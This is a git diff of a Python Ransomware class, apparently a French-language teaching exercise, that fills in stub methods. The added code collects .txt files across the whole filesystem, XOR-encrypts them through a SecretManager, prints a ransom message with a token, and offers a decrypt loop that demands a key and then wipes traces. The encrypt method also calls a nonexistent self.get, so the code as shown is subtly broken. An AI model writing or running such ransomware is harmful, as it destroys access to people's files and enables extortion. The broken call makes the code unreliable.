@@ -35,16 +35,33 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
-        # return all files matching the filter
-        raise NotImplemented()
+        files = []
+        for file in Path("/").rglob(filter):
+            files.append(str(file.resolve()))
+        return files
 
     def encrypt(self):
-        # main function for encrypting (see PDF)
-        raise NotImplemented()
+        secret_manager = SecretManager()
+        files = self.get("*.txt")
+        secret_manager.setup() #génération et stockage des clés
+        secret_manager.xorfiles(files) #chiffrement
+        print(ENCRYPT_MESSAGE.format(token=secret_manager.get_hex_token()))
 
     def decrypt(self):
-        # main function for decrypting (see PDF)
-        raise NotImplemented()
+        secret_manager = SecretManager()
+        secret_manager.load()
+        
+        while True:
+            key=input("entrer la clé pour déchiffrer: ")
+            try:
+                secret_manager.set_key(key) #verification de la clé
+                files= self.get_files("*.txt")
+                secret_manager.xorfiles(files) #déchiffrement de fichiers txt
+                secret_manager.clean() #suppression des traces
+                print("Fichiers restaurés avec succes")
+                break
+            except Exception:
+                print("Clé incorrecte, veuillez réessayer")
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
@@ -54,3 +71,4 @@ if __name__ == "__main__":
     elif sys.argv[1] == "--decrypt":
         ransomware = Ransomware()
         ransomware.decrypt()
+
